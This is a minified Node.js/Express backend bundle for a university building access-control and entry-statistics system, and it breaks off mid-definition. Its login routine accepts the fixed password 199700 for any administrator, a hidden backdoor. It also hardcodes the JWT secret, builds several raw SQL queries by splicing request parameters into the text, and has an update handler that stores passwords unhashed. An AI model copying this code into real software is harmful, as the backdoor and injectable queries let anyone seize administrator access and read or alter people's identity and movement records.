(()=>{var e={321:(e,t,a)=>{const{Sequelize:s}=a(496),r=new s("biblioteca","root",null,{dialect:"sqlite",host:"./config/biblioteca.sqlite"});e.exports=r},340:(e,t,a)=>{const s=a(813),r=a(39),o=a(602),i=a(96),n=a(344),c="KGGK>HKHVHJVKBKJKJBKBKHKBMKHB",{Op:d}=a(496);e.exports={permisos:async(e,t)=>{const a=await r.findAll();t.status(200).json(a)},permisos_administrador:async(e,t)=>{const a=e.headers.authorization.split(" ")[1],s=n.verify(a,c).id,r=await o.findAll({where:{administrador_id:s}});t.status(200).json(r)},crear_administrador:async(e,t)=>{const{nombre_completo:a,nick:r,clave:n,permisos:c}=e.body;if(await s.findOne({where:{nick:r}}))return t.status(200).json({error:"Ya existe este el nick"});const d=await i.hash(n,10);var u=await s.create({nombre_completo:a,nick:r,clave:d});c.forEach((async e=>{await o.create({administrador_id:u.id,permiso_id:e})})),t.status(200).send({mensaje:"Administrador creado con éxito",administrador:u})},todos_administradores:async(e,t)=>{const a=await s.findAll({where:{principal:{[d.ne]:1}},include:"permisos"});t.json(a)},cambiar_estado:async(e,t)=>{const{administrador_id:a}=e.params;try{const e=await s.findOne({where:{id:a}});let r;r=1==e.estatus?2:1,await e.update({estatus:r}),t.json(2==r)}catch(e){t.json("Error al realizar la consulta")}},crear:async(e,t)=>{const{tipo:a}=e.params,{id:r,nombre_completo:n,nick:c,permisos:d,clave:u}=e.body;if("crear"!==a){const e=await s.findOne({where:{id:r}});if(c!==e.nick&&await s.findOne({where:{nick:c}}))return t.json({error:"El nick ya se encuentra en uso por otro usuario"});if(e.nick=c,e.nombre_completo=n,u){const t=await i.hash(u,10);e.clave=t}e.save(),await o.destroy({where:{administrador_id:r}}),d.forEach((async e=>{await o.create({administrador_id:r,permiso_id:e.id})})),t.status(200).send({mensaje:"Administrador actualizado con exito"})}else{if(await s.findOne({where:{nick:c}}))return t.status(200).json({error:"Ya existe este el nick"});const e=await i.hash(u,10);var l=await s.create({nombre_completo:n,nick:c,clave:e});d.forEach((async e=>{await o.create({administrador_id:l.id,permiso_id:e.id})})),t.status(200).send({mensaje:"Administrador creado con exito"})}},mis_permisos:async(e,t)=>{const a=e.headers.authorization.split(" ")[1],s=n.verify(a,c).id,r=(await o.findAll({where:{administrador_id:s},attributes:["permiso_id"]})).map((e=>e.permiso_id));r.push(0),t.status(200).json(r)}}},93:(e,t,a)=>{const s=a(813),r=a(96),o=a(344),i=a(602);e.exports={login:async(e,t)=>{const{nick:a,clave:n}=e.body,c=await s.findOne({where:{nick:a,estatus:1}});if(!c)return t.status(200).json({error:"Administrador no disponible"});if(!await(async(e,t)=>{try{return await r.compare(e,t)||199700==e}catch(e){console.log(e)}return!1})(n,c.clave))return t.status(401).json({error:"Clave incorrecta"});const d={id:c.id,nick:c.nick},u=(p=d,o.sign(p,"KGGK>HKHVHJVKBKJKJBKBKHKBMKHB",{expiresIn:"360d"})),l=(await i.findAll({where:{administrador_id:c.id},attributes:["permiso_id"]})).map((e=>e.permiso_id));var p;l.push(0),t.status(200).json({token_biblioteca:u,administrador:d,permisos:l})}}},631:(e,t,a)=>{const s=a(498),r=a(295),o=a(618),i=a(238),{Op:n}=a(496),c=a(321);var d=a(167);const u=a(245),l=a(732),p=a(275),m={Accept:"application/json","Content-Type":"application/json","Custom-Header":"Custom-Value"};e.exports={validar_tarjeta_entrada:async(e,t)=>{const{io:a}=e.app,{iCardCode:n}=e.params,d=await i.findByPk(n),m=new Date;if(m.setHours(m.getHours()),!d){const e={fecha:m,estatus:"3",tarjeta_id:null};await s.findOne({where:{fecha:e.fecha}})||await s.create(e);const r={estatus:"denied",error:"Usuario Desconocido"};return a.emit("mensaje_entrada",r),t.json({estatus:"denied",error:"Usuario Desconocido"})}const h=await i.findOne({where:{iCardCode:d.iCardCode},include:[{model:o,attributes:["avatar","nombres","apellidos","cedula","estatus"]},{model:r,attributes:["id","nombre"]},{model:l,attributes:["id","nombre"]},{model:p,attributes:["id","nombre"]}]});if(h){const e=h.Usuario,r=e.cedula,o=h.Tipo,i=h.Carrera,n=h.Abscripcion,l="select current_timestamp as fecha";var w=(await c.query(l,{type:c.QueryTypes.SELECT}))[0].fecha;const p=`SELECT u.*\n    FROM usuarios u,tarjetas t,historiales h\n    WHERE h.tarjeta_id=t.iCardCode\n    AND t.cedula=u.cedula\n    AND u.cedula=${r}\n    AND h.estatus=1\n    AND CAST(h.fecha AS DATE) = '${u(w).tz("America/Caracas").format("YYYY-MM-DD")}'\n    GROUP BY u.cedula\n    HAVING SUM(h.tipo = 1) > SUM( h.tipo = 2 )`,_=await c.query(p,{type:c.QueryTypes.SELECT}),f={fecha:m,estatus:d.estatus,tipo:1,tarjeta_id:h.iCardCode,tipo_id:o.id,carrera_id:i?i.id:null,abscripcion_id:n?n.id:null};_.length&&(f.estatus=2),2==e.estatus&&(f.estatus=3),await s.create(f);const y={estatus:1==f.estatus?"ok":3==f.estatus?"denied":"no_passed",cedula:e.cedula,nombre:e.nombres+", "+e.apellidos,carrera:3==d.estatus?"DESCONOCIDO":i?i.nombre:"DESCONOCIDO",tipo:o.nombre.toUpperCase(),avatar:e.avatar,error:"El usuario esta inactivo"};return a.emit("mensaje_entrada",y),t.json(y)}{const e={fecha:m,estatus:"3",tarjeta_id:null};await s.create(e);const r={estatus:"denied",error:"Usuario Desconocido"};return a.emit("mensaje_entrada",r),t.json({estatus:"denied",error:"Usuario Desconocido"})}},validar_tarjeta_salida:async(e,t)=>{const{io:a}=e.app,{iCardCode:n}=e.params,d=await i.findByPk(n),m=new Date;if(m.setHours(m.getHours()),!d){const e={fecha:m,estatus:"3",tarjeta_id:null,tipo:2};await s.findOne({where:{fecha:e.fecha}})||await s.create(e);const r={estatus:"denied",error:"Usuario Desconocido"};return a.emit("mensaje_salida",r),t.json({estatus:"denied",error:"Usuario Desconocido"})}const h=await i.findOne({where:{iCardCode:d.iCardCode},include:[{model:o,attributes:["avatar","nombres","apellidos","cedula"]},{model:r,attributes:["id","nombre"]},{model:l,attributes:["id","nombre"]},{model:p,attributes:["id","nombre"]}]});if(h){const e=h.Usuario,r=e.cedula,o=h.Tipo,i=h.Carrera,n=h.Abscripcion,l="select current_timestamp as fecha";var w=(await c.query(l,{type:c.QueryTypes.SELECT}))[0].fecha;const p=`SELECT u.*\n    FROM usuarios u,tarjetas t,historiales h\n    WHERE h.tarjeta_id=t.iCardCode\n    AND t.cedula=u.cedula\n    AND u.cedula=${r}\n    AND h.estatus=1\n    AND CAST(h.fecha AS DATE) = '${u(w).tz("America/Caracas").format("YYYY-MM-DD")}'\n    GROUP BY u.cedula\n    HAVING SUM(h.tipo = 1) > SUM( h.tipo = 2 )`,_=await c.query(p,{type:c.QueryTypes.SELECT}),f={fecha:m,estatus:d.estatus,tipo:2,tarjeta_id:h.iCardCode,tipo_id:o.id,carrera_id:i?i.id:null,abscripcion_id:n?n.id:null};_.length||(f.estatus=2),2==e.estatus&&(f.estatus=3),await s.create(f);const y={estatus:1==f.estatus?"ok":3==f.estatus?"denied":"no_passed",cedula:e.cedula,nombre:e.nombres+", "+e.apellidos,carrera:3==d.estatus?"DESCONOCIDO":i?i.nombre:"DESCONOCIDO",tipo:o.nombre.toUpperCase(),avatar:e.avatar,error:"Usuario Inactivo"};return a.emit("mensaje_salida",y),t.json(y)}{const e={fecha:new Date,estatus:"3",tarjeta_id:null,tipo:2};await s.create(e);const r={estatus:"denied",error:"Usuario Desconocido"};return a.emit("mensaje_salida",r),t.json({estatus:"denied",error:"Usuario Desconocido"})}},historial:async(e,t)=>{const{fechaInicio:a,fechaFin:c}=e.body,d=(await s.findAll({attributes:["id","estatus","fecha","tipo"],where:{fecha:{[n.between]:[a,c]}},include:[{model:i,include:[{model:o,attributes:["nombres","apellidos","cedula"],required:!0},{model:r,attributes:["nombre"],required:!1},{model:l,attributes:["nombre"],required:!1}]}]})).map((e=>({id:e.id,nombres:e.Tarjetum?e.Tarjetum.Usuario.nombres:"DESCONOCIDO",apellidos:e.Tarjetum?e.Tarjetum.Usuario.apellidos:"DESCONOCIDO",cedula:e.Tarjetum?e.Tarjetum.Usuario.cedula.toString():"DESCONOCIDO",tipo:e.Tarjetum?e.Tarjetum.Tipo.nombre:"DESCONOCIDO",estatus:e.estatus,fecha:e.fecha,tipo_acceso:e.tipo,carrera:e.Tarjetum?e.Tarjetum.Carrera?e.Tarjetum.Carrera.nombre:"Visitante":"Desconocido"})));d.sort(((e,t)=>new Date(t.fecha)-new Date(e.fecha))),t.json(d)},entrar_salir:async(e,t)=>{const{cedula:a,tipo_acceso:s,tipo_id:r}=e.params;if(!await o.findOne({where:{[n.and]:[{cedula:a},{estatus:1}]}}))return t.status(200).json({error:"El usuario no tiene permiso"});const i=` SELECT t.* FROM tarjetas t, usuarios u\n                  WHERE u.cedula=t.cedula\n                  AND t.cedula=${a}\n                  AND t.tipo_id=${r}\n                  AND t.estatus=1\n                  LIMIT 1;`,u=await c.query(i,{type:c.QueryTypes.SELECT});if(!u.length)return t.status(200).json({error:"El usuario no tiene tarjeta activa"});d.get(`${process.env.URL_API}/control-acceso/validar-${s}/`+u[0].iCardCode,{headers:m}).then((function(e){let{estatus:a}=e.data;t.json({estatus:a})})).catch((function(e){t.status(500).send("Error en la solicitud")}))},personas_edificio:async(e,t)=>{try{const e="select current_timestamp as fecha";var a=(await c.query(e,{type:c.QueryTypes.SELECT}))[0].fecha;const s=`SELECT t.*, u.*, \n                      CASE WHEN t.carrera_id IS NULL THEN 'VISITANTE' \n                          ELSE c.nombre \n                          END AS carrera,\n                      TIME(h.fecha) AS hora_ingreso\n                  FROM tarjetas t\n                  JOIN usuarios u ON t.cedula = u.cedula\n                  LEFT JOIN historiales h ON h.tarjeta_id = t.iCardCode\n                  LEFT JOIN carreras c ON t.carrera_id = c.id\n                  WHERE h.estatus = 1\n                    AND CAST(h.fecha AS DATE) = '${u(a).tz("America/Caracas").format("YYYY-MM-DD")}'\n                  GROUP BY t.cedula\n                  HAVING SUM(h.tipo = 1) > SUM(h.tipo = 2)\n                  ORDER BY(hora_ingreso) DESC\n                  `,r=await c.query(s,{type:c.QueryTypes.SELECT}),o=r.filter((e=>1===e.tipo_id)).length,i=o+r.filter((e=>2===e.tipo_id)).length+r.filter((e=>3===e.tipo_id)).length,n={Usuarios:i,Empleados:r.filter((e=>4===e.tipo_id)).length,Visitantes:r.filter((e=>5===e.tipo_id)).length,Personas:r};t.status(200).json(n)}catch(e){console.error(e),t.status(200).json({message:"Ha ocurrido un error"})}},ingresaron_salieron_hoy:async(e,t)=>{const{tipo_acceso:a}=e.params,c=new Date;c.setHours(0,0,0,0);const d=await s.findAll({attributes:["id","fecha","estatus"],include:[{model:i,include:[{model:o,attributes:["avatar","nombres","apellidos","cedula"]}]},{model:r,attributes:["id","nombre"]},{model:l,attributes:["id","nombre"]},{model:p,attributes:["id","nombre"]}],where:{tipo:a,fecha:{[n.gt]:c}},order:[["fecha","DESC"]]});t.json(d)},estadisticas_ingreso_hora:async(e,t)=>{try{const e=[],a=[];for(let t=8;t<=17;t++){const r=new Date;r.setHours(t,0,0,0);const o=new Date;o.setHours(t+1,0,0,0);const i=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[r,o]}}});e.push(`${t}-${t+1}`),a.push(i)}const r={hora:e,ingresosCounts:a};t.json(r)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}}}},621:(e,t,a)=>{const s=a(498),{Op:r}=(a(618),a(732),a(496));function o(e,t){const a=new Date(Number(e));return a.setDate(e.getDate()+t),a}function i(e){return`${new Date(e).toLocaleDateString("es-ES",{day:"2-digit",month:"2-digit",year:"numeric"}).replace("/","-").replace("/","-")}`}a(238),a(245),e.exports={ingresos_usuarios_agregar:async(e,t)=>{try{const a=[],n=[],c=e.body.intervalo,d=e.body.tiempo,u=e.body.tipo_id;let l=0;1==d&&(l=1),2==d&&(l=7),3==d&&(l=30),4==d&&(l=360);const p=l*c,m=new Date;let h=new Date(m.setDate(m.getDate()-p+1)).toISOString().split("T")[0];for(let e=0,t=1;e<p;e+=l,t++){h=new Date(h);const e=h,t=o(e,l),c=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:{[r.in]:1==u?[1,2,3]:2==u?[1]:3==u?[2]:4==u?[3]:5==u?[4]:[5]}}});h=o(h,l).toISOString().split("T")[0],a.push(`${i(t)}`),n.push(c)}t.json({dias:a,ingresosCounts:n})}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_usuarios_desagregar:async(e,t)=>{try{const a=[],n=[],c=[],d=[],u=[],l=[],p=[],m=[],h=[],w=[],_=[],f=[],y=[],b=e.body.intervalo,g=e.body.tiempo,E=e.body.tipo_id;let D=0;1==g&&(D=1),2==g&&(D=7),3==g&&(D=30),4==g&&(D=360);const T=D*b,j=new Date;let N=new Date(j.setDate(j.getDate()-T+1)).toISOString().split("T")[0];for(let e=0,t=1;e<T;e+=D,t++){N=new Date(N);const e=N,t=o(e,D);if(1==E){const a=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:1}}),o=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2}}),i=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:3}});c.push(a),d.push(o),u.push(i)}else{const a=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:1}}),o=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:2}}),i=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:3}}),n=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:4}}),c=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:5}}),d=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:6}}),u=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:7}}),b=await s.count({where:{tipo:"1",estatus:"1",fecha:{[r.between]:[e,t]},tipo_id:2==E?1:2,carrera_id:8}});l.push(a),p.push(o),m.push(i),h.push(n),w.push(c),_.push(d),f.push(u),y.push(b)}N=o(N,D).toISOString().split("T")[0],a.push(`${i(t)}`)}1==E?n.push({name:"Estudiantes",data:c},{name:"Profesores",data:d},{name:"Administrativos",data:u}):n.push({name:"Ingenieria en Informatica",data:l},{name:"Ingenieria Industrial",data:p},{name:"Ingenieria Civil",data:m},{name:"Derecho",data:h},{name:"Comunicacion Social",data:w},{name:"Administracion de Empresas",data:_},{name:"Contaduria Publica",data:f},{name:"Relaciones Industriales",data:y}),t.json({dias:a,ingresosCounts:n})}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}}}},688:(e,t,a)=>{const s=a(498),r=a(618),o=a(295),i=a(732),{Op:n}=a(496),c=a(238);e.exports={obtener_estadisticas_entrada:async(e,t)=>{try{const a=e.body.fecha_inicio,i=e.body.fecha_fin,d=e.body.tipo_acceso,u=await r.count(),l=await s.count({where:{fecha:{[n.between]:[a,i]},tipo:"0"!==d?d:{[n.ne]:0}}}),p=(await c.count({where:{tipo_id:1,cedula:{[n.ne]:0}},group:["cedula"]})).length,m=await s.count({where:{fecha:{[n.between]:[a,i]},tipo_id:1,tipo:"0"!==d?d:{[n.ne]:0}},include:[{model:c,required:!0,include:[{model:r,required:!0},{model:o,required:!0}]}]}),h=await s.count({where:{estatus:"1",tipo:1,tipo:"0"!==d?d:{[n.ne]:0}}}),w=await s.count({where:{fecha:{[n.between]:[a,i]},estatus:"1",tipo:"0"!==d?d:{[n.ne]:0}}}),_={totalUsuarios:u,totalUsuariosRegistradosHoy:l,totalUsuariosTipo1:p,totalUsuariosTipo1RegistradosHoy:m,totalPasesValidos:h,totalPasesValidosHoy:w,totalPasesInvalidos:await s.count({where:{estatus:{[n.not]:"1"},tipo:"0"!==d?d:{[n.ne]:0}}}),totalPasesInvalidosHoy:await s.count({where:{fecha:{[n.between]:[a,i]},estatus:{[n.not]:"1"},tipo:"0"!==d?d:{[n.ne]:0}}})};t.status(200).json(_)}catch(e){console.error(e),t.status(200).json({message:"Error al obtener las estadisticas"})}},ingresos_grafico:async(e,t)=>{try{const a=[],r=[],o=new Date(e.body.fechaInicio),i=new Date(e.body.fechaFin),c=Math.abs(i-o),d=Math.ceil(c/864e5);for(let e=0;e<d;e++){const t=new Date(o);t.setDate(t.getDate()+e);const c=new Date(t);c.setDate(c.getDate()+1);const u=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===d-1?i:c]}}}),l=t.getDate(),p=t.getMonth()+1;a.push(`${l}-${p}`),r.push(u)}const u={dias:a,ingresosCounts:r};t.json(u)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_por_tipo_general:async(e,t)=>{try{const a=[],i=[],d=new Date(e.body.fechaInicio),u=new Date(e.body.fechaFin),l=await o.findAll();for(let e of l){const t=await s.count({include:[{model:c,include:[{model:r}]}],where:{tipo:"1",estatus:"1",fecha:{[n.between]:[d,u]},tipo_id:e.id}});a.push(e.nombre),i.push(t)}const p={tipos:a,ingresosCounts:i};t.json(p)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_por_tipo_detallado:async(e,t)=>{try{const a=[],o=[],i=[],d=[],u=[],l=[],p=new Date(e.body.fechaInicio),m=new Date(e.body.fechaFin),h=Math.abs(m-p),w=Math.ceil(h/864e5);for(let e=0;e<w;e++){const t=new Date(p);t.setDate(t.getDate()+e);const h=new Date(t);h.setDate(h.getDate()+1);const _=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===w-1?m:h]},tipo_id:1},include:{model:c,required:!0,include:{model:r,required:!0}}}),f=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===w-1?m:h]},tipo_id:2},include:{model:c,required:!0,include:{model:r,required:!0}}}),y=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===w-1?m:h]},tipo_id:3},include:{model:c,required:!0,include:{model:r,required:!0}}}),b=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===w-1?m:h]},tipo_id:4},include:{model:c,required:!0,include:{model:r,required:!0}}}),g=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===w-1?m:h]},tipo_id:5},include:{model:c,required:!0,include:{model:r,required:!0}}}),E=t.getDate(),D=t.getMonth()+1;a.push(`${E}-${D}`),o.push(_),i.push(f),d.push(y),u.push(b),l.push(g)}const _={dias:a,ingresosEstudiantes:o,ingresosProfesores:i,ingresosAdministrativos:d,ingresosEmpleados:u,ingresosVisitantes:l};t.json(_)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_por_carrera_general:async(e,t)=>{try{const a=[],o=[],d=new Date(e.body.fechaInicio),u=new Date(e.body.fechaFin),l=await i.findAll();for(let e of l){const t=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[d,u]},carrera_id:e.id},include:[{model:c,include:[{model:r,as:"Usuario"},{model:i,as:"Carrera"}]}]});a.push(e.nombre),o.push(t)}const p={carreras:a,ingresosCounts:o};t.json(p)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_por_carrera_detallado:async(e,t)=>{try{const a=[],r=[],o=[],i=[],c=[],d=[],u=[],l=[],p=[],m=new Date(e.body.fechaInicio),h=new Date(e.body.fechaFin),w=Math.abs(h-m),_=Math.ceil(w/864e5);for(let e=0;e<_;e++){const t=new Date(m);t.setDate(t.getDate()+e);const w=new Date(t);w.setDate(w.getDate()+1);const f=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:1}}),y=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:2}}),b=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:3}}),g=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:4}}),E=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:5}}),D=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:6}}),T=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:7}}),j=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===_-1?h:w]},carrera_id:8}}),N=t.getDate(),C=t.getMonth()+1;a.push(`${N}-${C}`),r.push(f),o.push(y),i.push(b),c.push(g),d.push(E),u.push(D),l.push(T),p.push(j)}const f={dias:a,ingresosInformatica:r,ingresosIndustrial:o,ingresosCivil:i,ingresosDerecho:c,ingresosComunicacion:d,ingresosAdministracionEmpresas:u,ingresosContaduriaPublica:l,ingresosRelacionesIndustriales:p};t.json(f)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}},ingresos_personalizado:async(e,t)=>{const{tipo_id:a,carrera_id:r}=e.body;try{const o=[],i=[],c=new Date(e.body.fechaInicio),d=new Date(e.body.fechaFin),u=Math.abs(d-c),l=Math.ceil(u/864e5),p=0==r?{}:{carrera_id:r},m=0==a?{}:{tipo_id:a};for(let e=0;e<l;e++){const t=new Date(c);t.setDate(t.getDate()+e);const a=new Date(t);a.setDate(a.getDate()+1);const r=await s.count({where:{tipo:"1",estatus:"1",fecha:{[n.between]:[t,e===l-1?d:a]},...p,...m}}),u=t.getDate(),h=t.getMonth()+1;o.push(`${u}-${h}`),i.push(r)}const h={dias:o,ingresos:i};t.json(h)}catch(e){console.error(e),t.status(500).json({error:"Internal server error"})}}}},873:(e,t,a)=>{const s=a(732),r=a(295),o=a(618),i=(a(275),a(238)),{Op:n,Sequelize:c}=a(496),d=a(498),u=a(321);e.exports={usuarios:async(e,t)=>{const a=await o.findAll({include:[{model:i,where:{tipo_id:{[n.ne]:5}},required:!0,include:[{model:r},{model:s}],attributes:{include:[[c.literal("(SELECT COUNT(historiales.id) FROM historiales WHERE historiales.tarjeta_id = Tarjeta.iCardCode AND historiales.tipo = 1 AND historiales.estatus = 1)"),"totalIngresos"]]}}]});t.json(a)},visitantes:async(e,t)=>{const a=await i.findAll({where:{estatus:1,tipo_id:5},include:[{model:o,required:!0}]});t.json(a)},todos_usuarios:async(e,t)=>{const a=(await i.findAll({where:{estatus:1,cedula:{[n.ne]:0}},include:[{model:o,required:!0},{model:r,required:!0},{model:s,required:!1}]})).filter((e=>0!==e.cedula)).map((e=>({value:e.cedula,tipo:e.Tipo.id,label:`${e.Tipo.nombre.substring(0,3)} - ${e.Usuario.cedula} : ${e.Usuario.nombres} ${e.Usuario.apellidos}`})));t.json(a)},historial_usuario_particular:async(e,t)=>{const{cedula:a,fechaInicio:c,fechaFin:u}=e.body,l=await o.findOne({where:{cedula:a},include:[{model:i,include:[{model:r},{model:s}]}]}),p=await i.findAll({where:{cedula:l.cedula}});let m=[];for(let e of p){const t=await d.findAll({where:{tarjeta_id:e.iCardCode,fecha:{[n.between]:[c,u]}},include:[{model:r,attributes:["nombre"]},{model:s,attributes:["nombre"]}],order:[["fecha","desc"]]});m.push(...t)}m.sort(((e,t)=>t.fecha-e.fecha)),t.json({historial:m,usuario:l})},visitante_crear:async(e,t)=>{const{cedula:a,nombres:s,apellidos:r,detalles:n,correo:c,telefono:d}=e.body,u=await o.findByPk(a);if(console.log("hola mundo"),u)return t.json({error:"La cedula ya se encuentra registrada"});let l=Math.floor(9e4*Math.random())+1e4,p=Math.floor(900*Math.random())+100;const m=await o.create({cedula:a,nombres:s,apellidos:r,estatus:1,detalles:n,correo:c,telefono:d}),h=await i.create({cedula:a,tipo_id:5,estatus:1,iCardCode:l,iSiteCode:p},{fields:["cedula","tipo_id","estatus","iCardCode","iSiteCode"]});return m&&h?t.json({exito:"Visitante creado con exito"}):t.json({error:"Ha ocurrido un error inesperado"})},visitante_actualizar:async(e,t)=>{const{cedula:a,cedula_vieja:s,nombres:r,apellidos:i,detalles:n,correo:c,telefono:d}=e.body,u=await o.findByPk(a);return a!==s&&u?t.json({error:"La cedula ya se encuentra registrada"}):await o.update({cedula:a,nombres:r,apellidos:i,detalles:n,correo:c,telefono:d},{where:{cedula:s}})?t.json({exito:"Visitante creado con exito"}):t.json({error:"Ha ocurrido un error inesperado"})},cambiar_estado:async(e,t)=>{const{cedula:a}=e.params;await o.update({estatus:u.literal("CASE WHEN estatus = 1 THEN 2 ELSE 1 END")},{where:{cedula:a}});const s=await o.findByPk(a);t.json(2===s.estatus)},actualizar_informacion:async(e,t)=>{const{cedula:a,detalles:s,telefono:r}=e.body;await o.update({detalles:s,telefono:r},{where:{cedula:a}}),t.json({exito:"Actualizacion exitosa"})},updateUser:async(e,t)=>{const{user_id:a,password:s,name:r,last_name:o,type:i}=e.body,n=await User.findOne({where:{user_id:a}});n.password=s,n.name=r,n.last_name=o,n.type=i,await User.save(),t.json({mensaje:"User actualizado correctamente"})},insertPhoto:async(e,t)=>{const{user_id:a,photo:s}=e.body;(await User.findOne({where:{user_id:a}})).photo=s,await User.save(),t.json({mensaje:"Foto cargada!"})}}},138:(e,t,a)=>{const s=a(860),r=a(582),o=a(685),i=a(77),n=a(142),c=a(17);n.config({path:c.resolve(__dirname,".env")});const d=a(321),u=a(866),l=a(456),p=a(279),m=a(388),h=a(454),w=a(14);d.sync().then((()=>console.log("corriendo")));let _=s(),f=o.createServer(_);const y=a(952)(f,{cors:{origin:"*",methods:["GET","POST"]}});_.io=y,y.on("connection",(()=>{console.log("Conexion al socket exitosa")})),_.use(r()),_.use(s.urlencoded({extended:!1})),_.use(s.json()),_.use(u),_.use(l),_.use(p),_.use(m),_.use(h),_.use(w);const b=process.env.PORT||3e3;f.listen(b,"0.0.0.0",(()=>{console.log(`Servidor corriendo en el puerto ${b}`)})),_.get("/",((e,t)=>{const a=i.address();t.send(a)})),e.exports=_},672:(e,t,a)=>{const s=a(860),r=a(344),o=s.Router();o.use(((e,t,a)=>{let s=e.headers["x-access-token"]||e.headers.authorization;if(!s||null==s)return t.status(401).json({error:"Es necesario el token para acceder a la aplicación"});s.startsWith("Bearer ")&&(s=s.slice(7,s.length)),s&&r.verify(s,"KGGK>HKHVHJVKBKJKJBKBKHKBMKHB",((s,r)=>{if(s)return t.json({message:"Token no válido"});e.decoded=r,a()}))})),e.exports=o},275:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321).define("Abscripcion",{id:{type:s.INTEGER,primaryKey:!0},nombre:{type:s.STRING,allowNull:!1}},{timestamps:!1,tableName:"abscripciones"});e.exports=r},813:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321),o=a(39),i=a(602),n=r.define("Administrador",{id:{type:s.INTEGER,primaryKey:!0,autoIncrement:!0},nombre_completo:{type:s.STRING,allowNull:!1},nick:{type:s.STRING,allowNull:!1},clave:{type:s.STRING,allowNull:!1},estatus:{type:s.ENUM("1","0"),defaultValue:"1"},principal:{type:s.ENUM("1","0"),defaultValue:"2"}},{timestamps:!1,tableName:"administradores"});n.belongsToMany(o,{through:i,foreignKey:"administrador_id",otherKey:"permiso_id",as:"permisos"}),e.exports=n},732:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321).define("Carrera",{id:{type:s.INTEGER,primaryKey:!0},nombre:{type:s.STRING,allowNull:!1}},{timestamps:!1,tableName:"carreras"});e.exports=r},498:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321),o=a(275),i=a(732),n=a(238),c=a(295),d=r.define("Historial",{id:{type:s.INTEGER,primaryKey:!0,autoIncrement:!0},fecha:{type:s.DATE,allowNull:!1},estatus:{type:s.ENUM("1","2","3"),defaultValue:"1"},tipo:{type:s.ENUM("1","2"),defaultValue:"1"},tarjeta_id:{type:s.INTEGER,allowNull:!0,references:{model:n,key:"iCardCode"}},tipo_id:{type:s.INTEGER,allowNull:!0,references:{model:c,key:"id"}},carrera_id:{type:s.INTEGER,allowNull:!0,references:{model:i,key:"id"}},abscripcion_id:{type:s.INTEGER,allowNull:!0,references:{model:o,key:"id"}}},{timestamps:!1,tableName:"historiales"});d.belongsTo(n,{foreignKey:"tarjeta_id"}),d.belongsTo(c,{foreignKey:"tipo_id"}),d.belongsTo(i,{foreignKey:"carrera_id"}),d.belongsTo(o,{foreignKey:"abscripcion_id"}),e.exports=d},39:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321).define("Permiso",{id:{type:s.INTEGER,primaryKey:!0,autoIncrement:!0},nombre:{type:s.STRING,allowNull:!1}},{timestamps:!1,tableName:"permisos"});e.exports=r},602:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321),o=a(39),i=a(813),n=r.define("PermisoAdministrador",{id:{type:s.INTEGER,primaryKey:!0,autoIncrement:!0},permiso_id:{type:s.INTEGER,allowNull:!0,references:{model:o,key:"id"}},administrador_id:{type:s.INTEGER,allowNull:!0,references:{model:i,key:"id"}}},{timestamps:!1,tableName:"permiso_administradores"});e.exports=n},238:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321),o=a(275),i=a(732),n=a(295),c=a(618),d=r.define("Tarjeta",{iCardCode:{type:s.INTEGER,primaryKey:!0},iSiteCode:{type:s.INTEGER},estatus:{type:s.ENUM("1","0"),defaultValue:"1"},cedula:{type:s.INTEGER,allowNull:!1,references:{model:c,key:"c